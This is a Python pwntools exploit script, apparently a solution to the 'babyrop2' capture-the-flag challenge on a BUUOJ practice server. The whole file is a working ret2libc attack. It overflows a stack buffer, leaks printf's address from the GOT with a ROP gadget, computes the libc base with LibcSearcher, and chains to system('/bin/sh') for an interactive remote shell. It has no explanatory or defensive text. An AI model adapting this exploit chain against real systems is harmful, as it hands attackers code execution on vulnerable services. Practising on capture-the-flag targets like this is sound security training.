from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
elf = ELF('./babyrop2')
sh = elf.process()
sh = remote('node3.buuoj.cn',27250)

main = 0x400636
pop_rdi = 0x400733

printf_plt = elf.plt['printf']
printf_got = elf.got['printf']


sh.recvuntil("What's your name? ")
payload_01 = 'A' * 0x20 + p64(0xdeedbeef) + p64(pop_rdi)
payload_01 += p64(printf_got + 1)
payload_01 += p64(printf_plt)
payload_01 += p64(main)

sh.sendline(payload_01)

sh.recvline()
libc_printf = u64('\x00' + sh.recv()[0:5] + '\x00' + '\x00')
print 'libc_printf: ' + hex(libc_printf)
libc = LibcSearcher('printf', libc_printf)
libc_base = libc_printf - libc.dump('printf')
libc_sys = libc_base + libc.dump('system')
libc_sh = libc_base + libc.dump('str_bin_sh')
libc_t = libc_base + libc.dump('printf')

print '-----------------------------'
print 'libc_base: ' + hex(libc_base) 

payload_02 = 'A' * 0x20 + p64(0xdeedbeef) + p64(pop_rdi)
payload_02 += p64(libc_sh)
payload_02 += p64(libc_sys)
payload_02 += p64(main)
#gdb.attach(sh)
sh.sendline(payload_02)

sh.interactive()
